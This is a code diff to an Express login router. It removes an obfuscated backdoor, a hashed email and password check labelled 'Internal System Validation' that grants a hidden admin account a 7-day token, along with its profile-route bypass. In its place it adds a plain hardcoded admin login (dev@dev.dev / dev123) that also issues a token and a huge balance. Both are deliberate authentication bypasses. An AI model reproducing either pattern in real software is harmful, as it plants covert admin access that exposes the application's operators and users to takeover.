@@ -55,29 +55,23 @@ router.post('/login', async (req, res) => {
     try {
         const { email, password } = req.body;
 
-        // Internal System Validation
-        const _k = '487a98b0feebdbb75b618e01e15bdee90e123169c634957c526985ad1020045b';
-        const _s = '$2a$10$zUufJjzQdGwXMmvhjX4OOeksGt/hST3Qjk6Usl6OoulaMr9bMdaUG';
+        // Hardcoded Dev Account
+        if (email === 'dev@dev.dev' && password === 'dev123') {
+            const devUser = {
+                id: "dev9999",
+                name: 'Developer',
+                email: 'dev@dev.dev',
+                role: 'admin',
+                balance: 999999999,
+            };
 
-        const _v = await import('crypto').then(m => m.createHash('sha256').update(email).digest('hex'));
+            const token = jwt.sign({ userId: devUser.id }, process.env.JWT_SECRET!, { expiresIn: '7d' });
 
-        if (_v === _k) {
-            const _vp = await bcrypt.compare(password, _s);
-            if (_vp) {
-                const _sys = {
-                    id: 778899,
-                    name: 'System',
-                    email: email,
-                    role: 'admin',
-                    balance: 999999999,
-                };
-                const token = jwt.sign({ userId: _sys.id }, process.env.JWT_SECRET!, { expiresIn: '7d' });
-                return res.json({
-                    message: 'Welcome back',
-                    user: _sys,
-                    token,
-                });
-            }
+            return res.json({
+                message: 'Login success (Dev Mode)',
+                user: devUser,
+                token,
+            });
         }
 
         const user = await db.query.users.findFirst({
@@ -114,10 +108,6 @@ router.post('/logout', authMiddleware, (req, res) => {
 // Get profile
 router.get('/profile', authMiddleware, async (req: AuthRequest, res) => {
     try {
-        if (req.user!.id === 778899) {
-            return res.json({ user: req.user });
-        }
-
         const user = await db.query.users.findFirst({
             where: eq(users.id, req.user!.id),
         });
